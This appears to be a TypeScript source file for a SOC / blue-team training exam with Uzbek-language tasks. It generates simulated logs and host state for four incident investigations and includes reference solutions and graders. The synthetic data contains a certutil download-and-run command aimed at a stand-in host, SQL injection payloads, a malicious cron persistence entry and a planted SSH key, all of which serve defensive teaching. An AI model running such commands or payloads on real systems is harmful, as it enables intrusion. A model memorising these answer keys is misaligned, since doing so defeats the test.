import type { Exam, ExamPractical } from '../examTypes';
import type { Row, SiemEvent, SiemResult } from '../../engine/siem/types';
import { cell, column } from '../../engine/siem';
import { strftime } from '../../engine/siem/values';
import { parseBank } from '../../engine/exam';
import { colIs, oneNumber, prng, utc } from '../labs/siem';
import { kql, spl } from '../labs/run';
import { fileAt } from '../labs/helpers';
import { SOC_BANK } from './socBank';

/*
 * The SOC exam's practical part. Every scenario is new (not the WS-BUX-014 incident of the lessons), so answers
 * cannot be remembered from the labs. Expected answers are computed from the generated data.
 */

const ok = (r: SiemResult | undefined): r is SiemResult => !!r && !r.error && r.rows.length > 0;

/* ── practical 1: Splunk, a new phishing incident ────────────────────── */

interface Host {
  name: string;
  ip: string;
  user: string;
}

const V1: Host = { name: 'WS-KAD-021', ip: '10.10.40.21', user: 'm.yuldasheva' };
const V2: Host = { name: 'WS-KAD-017', ip: '10.10.40.17', user: 's.nematov' };
const C2 = '198.51.100.140';
const C2_PORT = 8443;
const DL_URL = 'http://cdn-fonts.example-static.net/f.dat';
const DROP = String.raw`C:\Users\Public\fontsvc.exe`;
const OFFICE = String.raw`C:\Program Files\Microsoft Office\root\Office16`;
const SYS32 = String.raw`C:\Windows\System32`;
const OFFICE_HOSTS: Host[] = [
  ...['a.karimov', 'n.tosheva', 'j.rahimov', 'z.qodirova', 'o.saidov', 'f.ergasheva', 'b.olimov', 'k.yusupova', 'u.nazarov', 'd.aminova'].map((user, i) => ({
    name: `WS-KAD-${String(i + 3).padStart(3, '0')}`,
    ip: `10.10.40.${i + 3}`,
    user,
  })),
  V2,
  V1,
  { name: 'WS-IT-004', ip: '10.10.30.4', user: 'r.sobirov' },
];
const OUTSIDE = ['192.0.2.44', '192.0.2.71', '192.0.2.90', '198.51.100.14', '198.51.100.27', '203.0.113.80'];

function buildSiem(): { sysmon: SiemEvent[]; firewall: SiemEvent[] } {
  const rnd = prng(20261120);
  const sysmon: SiemEvent[] = [];
  const firewall: SiemEvent[] = [];
  const iso = (t: number) => strftime(t, '%Y-%m-%dT%H:%M:%S.000Z');
  let pid = 5200;
  const proc = (t: number, h: Host, image: string, cmd: string, parent: string) => {
    const user = `CORP\\${h.user}`;
    sysmon.push({
      _time: t,
      _raw: `${iso(t)} EventCode=1 Computer=${h.name}.corp.local User=${user} ProcessId=${pid} Image=${image} ParentImage=${parent} CommandLine=${cmd}`,
      index: 'sysmon',
      sourcetype: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
      host: h.name,
      source: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
      EventCode: 1,
      User: user,
      ProcessId: pid++,
      Image: image,
      ParentImage: parent,
      CommandLine: cmd,
    });
  };
  const conn = (t: number, h: Host, image: string, dst: string, port: number, bytes: number) => {
    sysmon.push({
      _time: t,
      _raw: `${iso(t)} EventCode=3 Computer=${h.name}.corp.local Image=${image} SourceIp=${h.ip} DestinationIp=${dst} DestinationPort=${port}`,
      index: 'sysmon',
      sourcetype: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
      host: h.name,
      source: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
      EventCode: 3,
      Image: image,
      SourceIp: h.ip,
      DestinationIp: dst,
      DestinationPort: port,
    });
    firewall.push({
      _time: t,
      _raw: `${strftime(t, '%Y/%m/%d %H:%M:%S')},TRAFFIC,end,${h.ip},${dst},${port},ssl,allow,${bytes},${200 + Math.floor(rnd() * 900)}`,
      index: 'firewall',
      sourcetype: 'pan:traffic',
      host: 'fw-edge-01',
      source: 'udp:514',
      src_ip: h.ip,
      dest_ip: dst,
      dest_port: port,
      app: 'ssl',
      action: 'allow',
      bytes_out: bytes,
    });
  };

  const day = utc('2026-11-20T03:40:00Z');
  const end = utc('2026-11-20T09:00:00Z');
  const explorer = String.raw`C:\Windows\explorer.exe`;
  const chrome = String.raw`C:\Program Files\Google\Chrome\Application\chrome.exe`;
  for (const h of OFFICE_HOSTS) {
    const start = day + Math.floor(rnd() * 1800);
    proc(start, h, `${OFFICE}\\OUTLOOK.EXE`, `"${OFFICE}\\OUTLOOK.EXE"`, explorer);
    proc(start + 40, h, chrome, `"${chrome}"`, explorer);
    for (let t = start + 60; t < end; t += 300 + Math.floor(rnd() * 900)) conn(t, h, chrome, OUTSIDE[Math.floor(rnd() * OUTSIDE.length)]!, 443, 600 + Math.floor(rnd() * 5000));
  }
  // An ordinary Excel child on an IT machine, so "children of Excel" is not only the attack.
  const it = OFFICE_HOSTS.find((h) => h.name === 'WS-IT-004')!;
  proc(day + 3600, it, `${OFFICE}\\EXCEL.EXE`, `"${OFFICE}\\EXCEL.EXE" "C:\\Users\\${it.user}\\Documents\\inventar.xlsx"`, explorer);
  proc(day + 3700, it, `${SYS32}\\splwow64.exe`, `${SYS32}\\splwow64.exe 8192`, `${OFFICE}\\EXCEL.EXE`);

  const infect = (h: Host, t0: number, file: string) => {
    proc(t0, h, `${OFFICE}\\EXCEL.EXE`, `"${OFFICE}\\EXCEL.EXE" "C:\\Users\\${h.user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q7RX2K\\${file}"`, `${OFFICE}\\OUTLOOK.EXE`);
    proc(t0 + 6, h, `${SYS32}\\cmd.exe`, `cmd.exe /c certutil -urlcache -split -f ${DL_URL} ${DROP} && ${DROP}`, `${OFFICE}\\EXCEL.EXE`);
    proc(t0 + 7, h, `${SYS32}\\certutil.exe`, `certutil -urlcache -split -f ${DL_URL} ${DROP}`, `${SYS32}\\cmd.exe`);
    proc(t0 + 9, h, DROP, DROP, `${SYS32}\\cmd.exe`);
    for (let t = t0 + 60; t < end; t += 120 + Math.floor(rnd() * 9) - 4) conn(t, h, DROP, C2, C2_PORT, 380 + Math.floor(rnd() * 40));
  };
  infect(V1, utc('2026-11-20T06:12:05Z'), 'Oylik_jadval_noyabr.xlsm');
  infect(V2, utc('2026-11-20T07:41:30Z'), 'Oylik_jadval_noyabr.xlsm');
  return { sysmon, firewall };
}

const SIEM = buildSiem();
const BEACONS = SIEM.sysmon.filter((e) => e.EventCode === 3 && e.DestinationIp === C2);
const BEACONS_V1 = BEACONS.filter((e) => e.host === V1.name).map((e) => e._time).sort((a, b) => a - b);
const INTERVAL = Math.round((BEACONS_V1[BEACONS_V1.length - 1]! - BEACONS_V1[0]!) / (BEACONS_V1.length - 1));

const siemPractical: ExamPractical = {
  id: 's-siem',
  topic: 'siem',
  title: "Splunk: kadrlar bo'limidagi ogohlantirish",
  panes: ['siem'],
  intro:
    "2026-yil 20-noyabr, 08:55 UTC. EDR ogohlantirishi: **WS-KAD-021** (kadrlar bo'limi, `m.yuldasheva`) dan noma'lum manzilga muntazam ulanishlar. Splunk indekslari: `sysmon` (EventCode 1 — jarayon yaratilishi, 3 — tarmoq ulanishi) va `firewall`. Vaqtlar UTC.",
  shell: () => ({ fs: { home: { talaba: {} } }, siem: { now: '2026-11-20T09:00:00Z', indexes: { sysmon: SIEM.sysmon, firewall: SIEM.firewall } } }),
  tasks: [
    {
      id: 'parent',
      text: "Excel ishga tushirgan jarayonlarni toping. Natijada ota-jarayoni Excel bo'lgan jarayonlar ko'rinsin.",
      solution: [spl('index=sysmon EventCode=1 ParentImage=*EXCEL.EXE | table _time host Image')],
      check: ({ siem }) => {
        const r = siem?.result;
        if (!ok(r) || !column(r, 'Image').some((i) => /\\cmd\.exe$/i.test(i))) return false;
        const parents = column(r, 'ParentImage');
        return parents.some((p) => p) ? parents.every((p) => /EXCEL\.EXE$/i.test(p)) : /excel/i.test(siem!.query);
      },
    },
    {
      id: 'download',
      text: "Zararli fayl qaysi manzildan yuklab olingan? Yuklagan buyruqning `CommandLine` maydoni ko'rinadigan natija chiqaring (20 qatordan oshmasin).",
      solution: [spl('index=sysmon EventCode=1 Image=*certutil.exe | table _time host CommandLine')],
      check: ({ siem }) => ok(siem?.result) && siem!.result.rows.length <= 20 && column(siem!.result, 'CommandLine').some((c) => c.includes(DL_URL)),
    },
    {
      id: 'c2',
      text: "Yuklangan dastur qaysi IP va portga ulanadi? Uning tarmoq ulanishlarini manzil va port bo'yicha sanang (`count` ustuni bilan).",
      solution: [spl('index=sysmon EventCode=3 Image=*fontsvc.exe | stats count by DestinationIp, DestinationPort')],
      check: ({ siem }) => {
        const r = siem?.result;
        if (!ok(r) || !r.columns.includes('count')) return false;
        const allowed = [BEACONS.length, BEACONS_V1.length];
        return r.rows.some((row) => cell(r, row, 'DestinationIp') === C2 && cell(r, row, 'DestinationPort') === String(C2_PORT) && allowed.includes(Number(row.count)));
      },
    },
    {
      id: 'interval',
      text: "WS-KAD-021 → C2 ulanishlarining o'rtacha oralig'ini soniyalarda hisoblang: butun songa yaxlitlab, `oraliq` nomli ustunda bitta qator qilib chiqaring.",
      solution: [spl(`index=firewall src_ip=${V1.ip} dest_ip=${C2} | stats count, min(_time) as boshi, max(_time) as oxiri | eval oraliq=round((oxiri-boshi)/(count-1))`)],
      check: ({ siem }) => {
        const v = oneNumber(siem?.result, 'oraliq');
        return v !== null && Math.abs(v - INTERVAL) <= 1;
      },
    },
    {
      id: 'scope',
      text: "Bu C2 bilan yana kim gaplashgan? Firewall'da shu manzilga ulangan barcha ichki manzillarni (`src_ip`) har biri bir qatordan chiqaring.",
      solution: [spl(`index=firewall dest_ip=${C2} | stats count by src_ip`)],
      check: ({ siem }) => colIs(siem?.result, 'src_ip', [V1.ip, V2.ip]),
    },
  ],
};

/* ── practical 2: web server logs ────────────────────────────────────── */

const SCANNER = '198.51.100.66';
const SQLI = '203.0.113.99';
const LEAK = '/backup.zip';

function webLogs(): { access: string; auth: string } {
  const rnd = prng(1120);
  const lines: [number, string][] = [];
  const t0 = utc('2026-11-20T05:00:00Z');
  const stamp = (t: number) => strftime(t, '%d/%b/%Y:%H:%M:%S +0000');
  const add = (t: number, ip: string, method: string, path: string, status: number, size: number, ua: string) =>
    lines.push([t, `${ip} - - [${stamp(t)}] "${method} ${path} HTTP/1.1" ${status} ${size} "-" "${ua}"`]);
  const browser = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36';
  const clients = Array.from({ length: 14 }, (_, i) => `192.0.2.${20 + i * 3}`);
  const pages: [string, string, number][] = [
    ['GET', '/', 200],
    ['GET', '/notes', 200],
    ['GET', '/notes/1042', 200],
    ['GET', '/static/app.css', 304],
    ['POST', '/login', 302],
    ['GET', '/api/notes', 200],
  ];
  for (let i = 0; i < 260; i++) {
    const [m, p, s] = pages[Math.floor(rnd() * pages.length)]!;
    add(t0 + Math.floor(rnd() * 14400), clients[Math.floor(rnd() * clients.length)]!, m, p, s, 300 + Math.floor(rnd() * 9000), browser);
  }
  // A few ordinary 404s from real visitors.
  for (const ip of clients.slice(0, 5)) add(t0 + Math.floor(rnd() * 14400), ip, 'GET', '/favicon.ico', 404, 153, browser);
  const words = ['.env', '.git/config', 'wp-admin/', 'phpmyadmin/', 'admin/', 'config.php.bak', 'server-status', 'db.sql', 'old/', 'test/', 'api/v1/debug', 'uploads/', 'backup/', '.htpasswd', 'install.php', 'console/'];
  const ts = t0 + 4000;
  let k = 0;
  for (const w of words) {
    for (const ext of ['', '.old', '~', '.1', '.save', '.tmp', '.orig']) {
      const path = `/${w}${ext}`;
      add(ts + Math.floor(k++ / 4), SCANNER, 'GET', path, path.startsWith('/.git') ? 403 : 404, 153, 'DirHunter/2.1');
    }
  }
  add(ts + Math.floor(k++ / 4), SCANNER, 'GET', LEAK, 200, 2483211, 'DirHunter/2.1');
  const payloads = ['UNION SELECT NULL--', 'union select username,password from users--', 'UnIoN SeLeCt 1,2,3--', "' OR '1'='1", 'UNION ALL SELECT version()--'];
  for (let i = 0; i < 17; i++) {
    const p = payloads[i % payloads.length]!;
    add(t0 + 9000 + i * 7, SQLI, 'GET', `/notes?id=1042%20${encodeURIComponent(p).replace(/'/g, '%27')}`, i % 5 === 3 ? 500 : 400, 220, 'python-requests/2.32.3');
  }
  lines.sort((a, b) => a[0] - b[0]);

  const auth: string[] = [];
  const at = (t: number) => strftime(t, '%b %d %H:%M:%S').replace(/ 0(\d) /, '  $1 ');
  auth.push(`${at(t0 + 120)} web-01 sshd[1022]: Accepted publickey for admin from 10.10.0.5 port 50122 ssh2`);
  const tries = ['root', 'admin', 'deploy', 'ubuntu', 'deploy', 'git', 'deploy', 'root', 'deploy', 'test', 'deploy', 'deploy'];
  tries.forEach((u, i) => auth.push(`${at(t0 + 9500 + i * 11)} web-01 sshd[22${10 + i}]: Failed password for ${u} from ${SQLI} port ${51000 + i * 3} ssh2`));
  auth.push(`${at(t0 + 9500 + tries.length * 11 + 4)} web-01 sshd[2290]: Accepted password for deploy from ${SQLI} port 51090 ssh2`);
  auth.push(`${at(t0 + 12000)} web-01 sshd[2301]: Accepted publickey for admin from 10.10.0.5 port 50340 ssh2`);
  return { access: lines.map((l) => l[1]).join('\n') + '\n', auth: auth.join('\n') + '\n' };
}

const WEB = webLogs();
const ACCESS_LINES = WEB.access.trim().split('\n');
const TOP_404 = (() => {
  const n = new Map<string, number>();
  for (const l of ACCESS_LINES) if (l.split(' ')[8] === '404') n.set(l.split(' ')[0]!, (n.get(l.split(' ')[0]!) ?? 0) + 1);
  return [...n].sort((a, b) => b[1] - a[1])[0]![0];
})();
const UNION_COUNT = ACCESS_LINES.filter((l) => /union/i.test(l)).length;

const webPractical: ExamPractical = {
  id: 's-weblog',
  topic: 'loglar',
  title: 'Veb-server loglari',
  intro:
    "`web-01` serverida Qaydnoma ishlaydi. Tunda trafik oshgani haqida xabar keldi. `/var/log/nginx/access.log` (combined format) va `/var/log/auth.log` ni tahlil qiling. Javob so'ralgan joyda buyruq **faqat javobni** chiqarsin.",
  shell: () => ({
    host: 'web-01',
    fs: { home: { talaba: {} }, var: { log: { nginx: { 'access.log': WEB.access }, 'auth.log': WEB.auth } }, tmp: {} },
  }),
  tasks: [
    {
      id: 'top404',
      text: "Eng ko'p 404 javob olgan IP manzil qaysi? Faqat IP'ni chiqaring.",
      solution: [`awk '$9 == 404 {print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -1 | awk '{print $2}'`],
      check: ({ output }) => output.trim() === TOP_404,
    },
    {
      id: 'leak',
      text: "Shu IP 200 (muvaffaqiyatli) javob olgan yo'l qaysi? Faqat yo'lni chiqaring.",
      solution: [`grep ${SCANNER} /var/log/nginx/access.log | awk '$9 == 200 {print $7}'`],
      check: ({ output }) => output.trim() === LEAK,
    },
    {
      id: 'union',
      text: "`UNION` so'zi (katta-kichik harf farqsiz) uchragan so'rovlar nechta? Faqat sonni chiqaring.",
      solution: ['grep -ic union /var/log/nginx/access.log'],
      check: ({ output }) => output.trim() === String(UNION_COUNT),
    },
    {
      id: 'ssh',
      text: "SQL injection sinagan manzil SSH orqali ham parol tanlagan. Oxir-oqibat qaysi hisobga kira olgan? Faqat hisob nomini chiqaring.",
      solution: [`grep "Accepted password" /var/log/auth.log | grep ${SQLI} | awk '{print $9}'`],
      check: ({ output }) => output.trim() === 'deploy',
    },
  ],
};

/* ── practical 3: a compromised Linux host ───────────────────────────── */

const SHELL_IP = '203.0.113.150';
const BAD_PID = 4711;
const ADMIN_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3qm8Yh2pQv7Lr0t9Wc4sXe1NbJ6uFz admin@ops-laptop';
const BAD_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPz8Rk2Lw0Qn5Ty7Vb3Xc9Md1Gf4Hs6Jq x@vps-77';

function irAccess(): string {
  const rnd = prng(4711);
  const out: string[] = [];
  const t0 = utc('2026-11-19T20:00:00Z');
  const ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0';
  for (let i = 0; i < 80; i++) {
    const t = t0 + i * 97;
    const ip = `192.0.2.${30 + Math.floor(rnd() * 12)}`;
    const path = ['/', '/notes', '/notes/1042', '/uploads/avatar_1043.png', '/static/app.css'][Math.floor(rnd() * 5)]!;
    out.push(`${ip} - - [${strftime(t, '%d/%b/%Y:%H:%M:%S +0000')}] "GET ${path} HTTP/1.1" 200 ${400 + Math.floor(rnd() * 8000)} "-" "${ua}"`);
    if (i === 30) out.push(`${SHELL_IP} - - [${strftime(t + 5, '%d/%b/%Y:%H:%M:%S +0000')}] "POST /profile/avatar HTTP/1.1" 302 0 "-" "curl/8.5.0"`);
    if (i > 31 && i < 38) out.push(`${SHELL_IP} - - [${strftime(t + 9, '%d/%b/%Y:%H:%M:%S +0000')}] "POST /uploads/img.php HTTP/1.1" 200 ${90 + i} "-" "curl/8.5.0"`);
  }
  return out.join('\n') + '\n';
}
const IR_ACCESS = irAccess();

const irPractical: ExamPractical = {
  id: 's-ir-host',
  topic: 'ir',
  title: 'Buzilgan Linux serverda javob choralari',
  intro:
    "`web-02` serverida protsessor yuklamasi keskin oshgan. Siz root sifatida kirdingiz. Vazifa: zararli jarayonni topib to'xtatish, qayta ishga tushish yo'lini va orqa eshikni yopish, kirish nuqtasini aniqlash. Javob so'ralgan joyda buyruq **faqat javobni** chiqarsin.",
  shell: () => ({
    host: 'web-02',
    user: 'root',
    cwd: '/root',
    fs: {
      root: { '.ssh': { authorized_keys: `${ADMIN_KEY}\n${BAD_KEY}\n` } },
      home: { talaba: {} },
      etc: {
        'cron.d': {
          certbot: '0 */12 * * * root certbot -q renew\n',
          'php-update': `*/5 * * * * www-data /dev/shm/.php-fpm -d >/dev/null 2>&1\n`,
          e2scrub_all: '30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n',
        },
      },
      var: {
        log: { nginx: { 'access.log': IR_ACCESS } },
        www: { qaydnoma: { uploads: { 'avatar_1043.png': '\u0089PNG\r\n', 'img.php': '<?php /* KiberAkademiya: web-shell namunasi (ishlamaydi) */ ?>\n' } } },
      },
      dev: { shm: { '.php-fpm': 'ELF\n' } },
      tmp: {},
    },
    system: {
      procs: [
        { pid: 1, ppid: 0, user: 'root', cmd: '/sbin/init' },
        { pid: 488, ppid: 1, user: 'root', cmd: 'sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups' },
        { pid: 602, ppid: 1, user: 'root', cmd: '/usr/sbin/cron -f' },
        { pid: 710, ppid: 1, user: 'root', cmd: 'nginx: master process /usr/sbin/nginx -g daemon on; master_process on;' },
        { pid: 711, ppid: 710, user: 'www-data', cmd: 'nginx: worker process' },
        { pid: 820, ppid: 1, user: 'root', cmd: 'php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)' },
        { pid: 821, ppid: 820, user: 'www-data', cmd: 'php-fpm: pool www' },
        { pid: BAD_PID, ppid: 1, user: 'www-data', cmd: '/dev/shm/.php-fpm -d', cpu: 97.3 },
        { pid: 5102, ppid: 488, user: 'root', cmd: 'sshd: root@pts/0' },
        { pid: 5110, ppid: 5102, user: 'root', cmd: '-bash' },
      ],
    },
  }),
  tasks: [
    {
      id: 'pid',
      text: "`/dev/shm` dan ishlayotgan jarayonning PID'i qaysi? Faqat PID'ni chiqaring.",
      solution: ["pgrep -f /dev/shm"],
      check: ({ output }) => output.trim() === String(BAD_PID),
    },
    {
      id: 'kill',
      text: "Shu jarayonni to'xtating.",
      solution: [`kill -9 ${BAD_PID}`],
      check: ({ state }) => !state.system.procs.some((p) => p.pid === BAD_PID),
    },
    {
      id: 'cron',
      text: "Jarayonni har 5 daqiqada qayta ishga tushiradigan cron faylini o'chiring (boshqa cron fayllariga tegmang).",
      solution: ['rm /etc/cron.d/php-update'],
      check: ({ state }) => fileAt(state, '/etc/cron.d/php-update') === null && fileAt(state, '/etc/cron.d/certbot') !== null && fileAt(state, '/etc/cron.d/e2scrub_all') !== null,
    },
    {
      id: 'key',
      text: "root'ning `authorized_keys` fayliga begona kalit qo'shilgan. Uni olib tashlang, administrator kaliti qolsin.",
      solution: ["sed -i '/x@vps-77/d' /root/.ssh/authorized_keys"],
      check: ({ state }) => {
        const keys = fileAt(state, '/root/.ssh/authorized_keys') ?? '';
        return keys.includes(ADMIN_KEY) && !keys.includes('x@vps-77');
      },
    },
    {
      id: 'entry',
      text: "Hujumchi yuklangan rasm o'rniga PHP fayl orqali buyruq bajargan. `uploads` ichidagi PHP faylga so'rov yuborgan IP qaysi? Faqat IP'ni chiqaring.",
      solution: ["grep '/uploads/.*\\.php' /var/log/nginx/access.log | awk '{print $1}' | sort -u"],
      check: ({ output }) => output.trim() === SHELL_IP,
    },
  ],
};

/* ── practical 4: Sentinel (KQL), cloud sign-ins ─────────────────────── */

const DOMAIN = 'corp.example.com';
const SPRAY_IP = '203.0.113.201';
const OFFICE_IP = '192.0.2.10';
const VICTIM_UPN = `b.ergashev@${DOMAIN}`;

function cloud(): { SigninLogs: Row[]; AuditLogs: Row[] } {
  const rnd = prng(2011);
  const users = ['a.karimov', 'n.tosheva', 'j.rahimov', 'z.qodirova', 'o.saidov', 'f.ergasheva', 'b.olimov', 'k.yusupova', 'u.nazarov', 'd.aminova', 'b.ergashev', 'r.sobirov', 'm.yuldasheva', 's.nematov', 'l.hasanova', 'g.tursunov'];
  const sign: Row[] = [];
  const audit: Row[] = [];
  const t0 = utc('2026-11-20T02:00:00Z');
  const app = ['Office 365 Exchange Online', 'Microsoft Teams', 'Office 365 SharePoint Online'];
  const s = (t: number, u: string, ip: string, loc: string, result: string) =>
    sign.push({ TimeGenerated: t, UserPrincipalName: `${u}@${DOMAIN}`, IPAddress: ip, Location: loc, ResultType: result, AppDisplayName: app[Math.floor(rnd() * app.length)]! });
  for (const u of users) {
    for (let i = 0; i < 2 + Math.floor(rnd() * 3); i++) s(t0 + 9000 + Math.floor(rnd() * 20000), u, OFFICE_IP, 'UZ', '0');
  }
  // Typos happen: a few failures from the office.
  for (const u of users.slice(0, 4)) s(t0 + 9500 + Math.floor(rnd() * 9000), u, OFFICE_IP, 'UZ', '50126');
  // A slow password spray at night: one guess per account, one of them works.
  users.forEach((u, i) => s(t0 + 1800 + i * 47, u, SPRAY_IP, 'NL', u === 'b.ergashev' ? '0' : '50126'));
  // A second, smaller source that only failed.
  for (const u of users.slice(0, 3)) s(t0 + 4000 + Math.floor(rnd() * 600), u, '198.51.100.23', 'DE', '50126');

  const a = (t: number, op: string, by: string, target: string) => audit.push({ TimeGenerated: t, OperationName: op, InitiatedBy: by, TargetResource: target, Result: 'success' });
  a(t0 + 10000, 'Reset password (self-service)', `n.tosheva@${DOMAIN}`, `n.tosheva@${DOMAIN}`);
  a(t0 + 12000, 'Update user', `r.sobirov@${DOMAIN}`, `l.hasanova@${DOMAIN}`);
  a(t0 + 15000, 'User registered security info', `l.hasanova@${DOMAIN}`, `l.hasanova@${DOMAIN}`);
  const won = Number(sign.find((r) => r.IPAddress === SPRAY_IP && r.ResultType === '0')!.TimeGenerated);
  a(won + 140, 'User registered security info', VICTIM_UPN, VICTIM_UPN);
  a(won + 400, 'Add inbox rule', VICTIM_UPN, `${VICTIM_UPN} (Inbox)`);
  return { SigninLogs: sign, AuditLogs: audit };
}

const CLOUD = cloud();
const SPRAY_USERS = new Set(CLOUD.SigninLogs.filter((r) => r.IPAddress === SPRAY_IP && r.ResultType !== '0').map((r) => r.UserPrincipalName)).size;
const VICTIM_OPS = CLOUD.AuditLogs.filter((r) => r.InitiatedBy === VICTIM_UPN).map((r) => String(r.OperationName));

const kqlPractical: ExamPractical = {
  id: 's-kql-cloud',
  topic: 'hunting',
  title: 'Sentinel: tungi kirishlar',
  panes: ['siem'],
  intro:
    "Microsoft Sentinel, **KQL**. `SigninLogs` (Entra ID kirishlari: `UserPrincipalName`, `IPAddress`, `Location`, `ResultType` — `\"0\"` muvaffaqiyatli, `\"50126\"` noto'g'ri parol) va `AuditLogs` (`OperationName`, `InitiatedBy`, `TargetResource`). Gipoteza: tunda parol purkash (password spray) bo'lgan.",
  shell: () => ({ fs: { home: { talaba: {} } }, siem: { now: '2026-11-20T12:00:00Z', tables: CLOUD } }),
  tasks: [
    {
      id: 'spray',
      text: "Qaysi IP eng ko'p **turli** hisobga muvaffaqiyatsiz kirishga uringan? Birinchi qatorda shu IP va hisoblar soni bo'lsin.",
      solution: [kql('SigninLogs | where ResultType != "0" | summarize dcount(UserPrincipalName) by IPAddress | top 1 by dcount_UserPrincipalName')],
      check: ({ siem }) => {
        const r = siem?.result;
        if (!ok(r) || siem!.lang !== 'kql') return false;
        const first = r.rows[0]!;
        return cell(r, first, 'IPAddress') === SPRAY_IP && Object.values(first).some((v) => v === SPRAY_USERS);
      },
    },
    {
      id: 'victim',
      text: 'Shu IP dan muvaffaqiyatli kirgan hisob(lar)ni chiqaring — `UserPrincipalName` ustuni bilan, har biri bir qatordan.',
      solution: [kql(`SigninLogs | where IPAddress == "${SPRAY_IP}" and ResultType == "0" | distinct UserPrincipalName`)],
      check: ({ siem }) => siem?.lang === 'kql' && colIs(siem.result, 'UserPrincipalName', [VICTIM_UPN]),
    },
    {
      id: 'after',
      text: "Kirgandan keyin shu hisob nomidan `AuditLogs` da qanday amallar bajarilgan? Faqat shu hisob boshlagan amallarni `OperationName` bilan chiqaring.",
      solution: [kql(`AuditLogs | where InitiatedBy == "${VICTIM_UPN}" | project TimeGenerated, OperationName, TargetResource`)],
      check: ({ siem }) => {
        const r = siem?.result;
        if (!ok(r) || siem!.lang !== 'kql') return false;
        const ops = column(r, 'OperationName');
        const by = column(r, 'InitiatedBy');
        return VICTIM_OPS.every((o) => ops.includes(o)) && ops.length === VICTIM_OPS.length && (!by.some((b) => b) || by.every((b) => b === VICTIM_UPN));
      },
    },
  ],
};

export const SOC_EXAM: Exam = {
  id: 'soc',
  title: 'SOC / Blue Team imtihoni',
  summary: "Loglar, SIEM (SPL va KQL), aniqlash vositalari, incident response va threat hunting — vaziyatli savollar va SIEM yoki terminalda ikki amaliy tekshiruv.",
  topics: [
    { id: 'loglar', title: 'Loglar va triage', stages: ['b1-soc-asoslari'] },
    { id: 'siem', title: 'SIEM va qoidalar', stages: ['b2-siem'] },
    { id: 'aniqlash', title: 'Aniqlash vositalari va TI', stages: ['b2-siem'] },
    { id: 'ir', title: 'Incident response va forensics', stages: ['b3-ir-forensics'] },
    { id: 'hunting', title: 'Threat hunting va bulut', stages: ['b4-hunting'] },
  ],
  questions: parseBank('soc', SOC_BANK),
  practicals: [siemPractical, webPractical, irPractical, kqlPractical],
};
